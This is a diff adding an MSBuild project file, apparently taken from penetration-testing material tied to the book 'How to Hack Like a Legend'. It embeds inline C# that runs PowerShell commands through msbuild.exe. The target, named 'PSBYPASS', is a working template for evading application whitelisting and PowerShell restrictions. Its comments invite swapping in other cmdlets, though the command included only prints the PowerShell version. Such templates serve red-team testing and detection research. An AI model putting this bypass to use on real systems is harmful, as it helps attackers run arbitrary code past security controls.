@@ -1,0 +1,63 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+<!--
+ msbuild project to execute PowerShell commands. Change line 41 to include cmdlets.
+ To execute: C:\Windows\Microsoft.Net\Framework\v4.0.30319\msbuild.exe psh.xml
+ 
+ Check out How to Hack Like a Legend for a full description and alternatives
+ 
+-->
+<Target Name="PSBYPASS">
+   <PsCommand/>
+</Target>
+
+<UsingTask
+    TaskName="PsCommand"
+    TaskFactory="CodeTaskFactory"
+AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+<Task>
+      <Reference Include="System.Management.Automation.dll"/>
+	  
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		// Import all the necessary DLLs
+		using System;
+		using Microsoft.Build.Framework;
+		using Microsoft.Build.Utilities;
+		using System.Management.Automation;
+		using System.Management.Automation.Host;
+		using System.Management.Automation.Runspaces;
+		using PowerShell = System.Management.Automation.PowerShell;
+
+		// main public class implementing Task and ITask interfaces required by msbuild
+		public class PsCommand :  Task, ITask
+		{
+
+		// Surcharge the Execute method inherited from Task interface. The execution thread starts here  
+		public override bool Execute() {
+
+			   // Output greeting
+			   Console.WriteLine("Executing PS commands");
+
+			   // Creating a PowerShell pipeline (command1 | command2 | ...)
+			   PowerShell Ps_instance = PowerShell.Create();
+
+			   // Chaining commands in the pipeline
+			   Ps_instance.AddScript("$PSVersionTable.PSVersion");
+			  // Ps_instance.AddCommand("out-string");
+
+			   // Invoking the pipeline and fetching output strings
+			   foreach (string str in Ps_instance.Invoke<string>())
+					Console.WriteLine(str);		
+
+			   Console.WriteLine("Press any key to exit...");
+			   Console.ReadKey();
+
+			   // End of the Execute method
+			   return true;
+			  }
+		}
+        ]]>
+      </Code>
+    </Task>
+</UsingTask>
+</Project>
